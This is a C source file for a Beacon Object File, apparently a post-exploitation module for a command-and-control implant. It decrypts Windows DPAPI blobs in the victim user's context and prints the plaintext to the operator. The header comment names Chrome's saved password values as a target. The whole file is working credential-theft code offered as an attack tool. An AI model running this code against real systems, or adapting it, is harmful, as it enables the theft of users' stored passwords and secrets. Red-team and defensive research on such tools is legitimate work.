/*
 * bof-dpapiblobdec <hex-blob> [hex-entropy]
 *
 * Decrypt a DPAPI blob with CryptUnprotectData in the current user context.
 * Accepts the raw blob as hex (spaces/colons/0x tolerated).  Use this for
 * blobs lifted from registry/files (for example Chrome's legacy v10
 * password_value) when you are running as the owning user.
 *
 * This is not a masterkey attack: the user's DPAPI masterkey must be
 * available to the current token.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static void print_plain(const unsigned char *p, DWORD n)
{
    int wide = 1, i;
    char out[2048];

    if (n >= 2 && (n % 2) == 0) {
        for (i = 1; i < (int)n; i += 2) {
            if (p[i] != 0) { wide = 0; break; }
        }
    } else {
        wide = 0;
    }

    if (wide) {
        wchar_t wbuf[1024];
        int chars = (int)(n / 2);
        if (chars > 1023) chars = 1023;
        bof_memcpy(wbuf, p, (unsigned int)chars * 2);
        wbuf[chars] = 0;
        bof_w2a(wbuf, out, sizeof(out));
        BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", out);
        return;
    }

    {
        int o = 0;
        for (i = 0; i < (int)n && o < (int)sizeof(out) - 1; i++) {
            unsigned char c = p[i];
            out[o++] = (c >= 0x20 && c < 0x7f) ? (char)c : '.';
        }
        out[o] = 0;
        BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", out);
        if (n > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "  (%lu bytes)\n", (unsigned long)n);
    }
}

void go(char *args, int alen)
{
    datap parser;
    char *hexblob, *hexent = "";
    int blen, elen;
    unsigned char raw[8192], ent[1024];
    int rawlen, entlen = 0;
    DATA_BLOB in, entropy, out;
    LPWSTR desc = NULL;

    BeaconDataParse(&parser, args, alen);
    hexblob = BeaconDataExtract(&parser, &blen);
    hexent  = BeaconDataExtract(&parser, &elen);
    if (!hexblob || !hexblob[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: dpapiblobdec <hex-blob> [hex-entropy]\n");
        return;
    }
    if (!hexent) hexent = "";

    rawlen = bof_hex_decode(hexblob, raw, sizeof(raw));
    if (rawlen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "invalid hex blob\n");
        return;
    }
    if (hexent[0]) {
        entlen = bof_hex_decode(hexent, ent, sizeof(ent));
        if (entlen <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "invalid hex entropy\n");
            return;
        }
    }

    in.pbData = raw;
    in.cbData = (DWORD)rawlen;
    entropy.pbData = entlen ? ent : NULL;
    entropy.cbData = (DWORD)entlen;
    bof_memzero(&out, sizeof(out));

    if (!CRYPT32$CryptUnprotectData(&in, &desc, entlen ? &entropy : NULL,
                                    NULL, NULL, 0, &out)) {
        BeaconPrintf(CALLBACK_ERROR, "CryptUnprotectData failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        if (desc) KERNEL32$LocalFree(desc);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] decrypted %lu bytes\n", (unsigned long)out.cbData);
    print_plain(out.pbData, out.cbData);

    if (desc) {
        char d[512];
        bof_w2a(desc, d, sizeof(d));
        BeaconPrintf(CALLBACK_OUTPUT, "  description: %s\n", d);
        KERNEL32$LocalFree(desc);
    }
    if (out.pbData) {
        bof_memzero(out.pbData, out.cbData);
        KERNEL32$LocalFree(out.pbData);
    }
}
